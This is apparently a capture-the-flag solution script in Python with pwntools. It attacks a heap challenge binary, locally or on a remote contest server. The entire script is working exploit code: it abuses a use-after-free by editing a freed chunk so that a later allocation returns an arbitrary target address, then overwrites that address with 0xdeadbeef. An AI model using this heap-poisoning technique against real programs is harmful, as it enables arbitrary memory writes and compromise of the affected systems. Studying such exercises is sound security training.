#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p)
        pause()
else:
    p = remote("alpha.hackac.live", 1002)

def alloc(idx, data):
    p.sendlineafter("> ", b"1")
    p.sendlineafter("Index: ", str(idx).encode())
    p.sendlineafter("Data: ", data)

def edit(idx, data):
    p.sendlineafter("> ", b"3")
    p.sendlineafter("Index: ", str(idx).encode())
    p.sendlineafter("Data: ", data)

def free(idx):
    p.sendlineafter("> ", b"4")
    p.sendlineafter("Index: ", str(idx).encode())

# good luck pwning :)
p.recvuntil(b"overwrite the value of ")
target = int(p.recvuntil(b" to 0xdeadbeef", drop=True), 16)
print(hex(target))

alloc(0, b"A" * 0x10)
alloc(1, b"A" * 0x10)
free(0)
free(1)
payload = flat(
    target - 0x10
)
edit(1, payload)

alloc(2, b"A" * 0x10)
alloc(3, p64(0xdeadbeef))

p.interactive()
